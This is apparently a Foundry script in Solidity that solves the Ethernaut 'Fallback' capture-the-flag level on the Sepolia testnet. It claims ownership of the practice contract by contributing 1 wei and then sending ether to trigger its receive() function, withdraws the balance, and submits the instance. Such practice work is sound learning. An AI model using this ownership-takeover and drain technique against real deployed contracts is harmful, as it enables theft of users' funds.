// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {ILevel} from "../../src/interfaces/ILevel.sol";
import {Fallback} from "ethernaut/contracts/src/levels/Fallback.sol";
import {Helpers} from "../Helpers.s.sol";

contract FallbackSolution is Script, Helpers {
    uint pvtKey;
    address myAddr;
    uint myBalance;
    address deployedInstanceByEthernaut;

    function run() external {
        pvtKey = vm.envUint("METAMASK_PRIVATE_KEY");
        myAddr = vm.addr(pvtKey);
        myBalance = myAddr.balance;
        console.log("My Address:",myAddr);
        console.log("My Balance:",myBalance);

        ILevel level = ILevel(0x3c34A342b2aF5e885FcaA3800dB5B205fEfa3ffB); // the supplied address is of factory contract on sepolia eth
        
        vm.startBroadcast(pvtKey);
        
        deployedInstanceByEthernaut = createInstance(myAddr, level);
        Fallback fallbackInstance = Fallback(payable(deployedInstanceByEthernaut));


        // solving the chall
        
        console.log("Owner of Deployed Fallback Instance:", fallbackInstance.owner());

        fallbackInstance.contribute{value: 1 wei}(); // sending 1 wei
        console.log("My Contribution after sending 1 wei:", fallbackInstance.getContribution());

        (bool sent,) = deployedInstanceByEthernaut.call{value: 1 wei}(""); // sent 1 wei with low level call with no data to triger receive()
        require(sent == true, "Failed to sent 1 wei to triger receive()");
        require(fallbackInstance.owner() == myAddr, "I'm not the owner!");
        console.log("Owner of Deployed Fallback Instance after trigering recieve():", fallbackInstance.owner());

        fallbackInstance.withdraw();
        console.log("Called withdrawal function!");

        console.log("My Balance after withdrawal:",myAddr.balance);
        require(myBalance <= myAddr.balance, "Received nothing after withdrawal!"); // can be equal cause we are the only one sending ether to contract and if we withdrawal then we'll only get the amount we sent


        // submitting on ethernaut
        submitInstance(deployedInstanceByEthernaut);

        getStats(myAddr);

        vm.stopBroadcast();
    }
}